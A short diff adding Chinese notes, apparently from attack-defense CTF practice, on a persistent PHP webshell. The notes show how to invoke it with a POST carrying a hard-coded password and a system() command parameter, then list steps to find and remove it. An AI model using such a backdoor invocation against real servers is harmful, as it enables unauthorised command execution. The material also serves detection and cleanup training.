@@ -1,0 +1,9 @@
+不死马使用：URL+.index.php POST pass=Sn3rtf4ck9&a=system('ipconfig');
+例如：http://127.0.0.1/.index.php
+post：pass=Sn3rtf4ck9&a=system('ipconfig');
+
+
+不死马的解除
+1.找到木马名字。
+2.找到创建，木马对应的进程
+3.修改解除不死马.php
